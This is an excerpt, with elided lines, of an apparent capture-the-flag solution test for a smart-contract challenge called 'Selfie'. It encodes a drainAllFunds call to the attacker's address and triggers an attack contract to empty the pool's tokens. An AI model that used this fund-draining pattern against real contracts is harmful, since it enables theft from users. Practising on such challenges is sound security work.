...
describe('[Challenge] Selfie', function () {
    ...
    it('Exploit', async function () {
        ...
        let ABI = ["function drainAllFunds(address receiver)"];
        let interface = new ethers.utils.Interface(ABI);
        let drainAllFunds = await interface.encodeFunctionData("drainAllFunds", [attacker.address]);

        const balanceOfPoolAddr = await this.token.balanceOf(this.pool.address);
        ...
        await this.selfieAttack.executeDrainAllFunds();
    });
